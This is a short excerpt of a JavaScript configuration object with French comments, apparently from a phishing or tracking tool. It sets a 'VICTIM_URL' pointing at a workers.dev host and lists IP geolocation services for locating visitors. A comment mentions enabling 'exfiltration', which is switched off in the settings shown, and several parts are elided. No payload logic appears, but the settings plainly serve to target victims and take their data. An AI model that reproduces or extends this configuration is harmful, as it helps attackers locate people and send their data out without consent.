...
const CONFIG = {
    ...
    VICTIM_URL: 'https://mutmsull.andrentihe20.workers.dev/',
    ...
    // Services gratuits de géolocalisation IP (DÉSACTIVÉS pour vitesse)
    GEO_API_PROVIDERS: [
        {
            name: 'ipapi.co',
            url: 'https://ipapi.co/json/',
            enabled: false  // Désactivé pour vitesse max
        },
        {
            name: 'ip-api.com',
    ...
    // Activer l'exfiltration (DÉSACTIVÉ pour vitesse max)
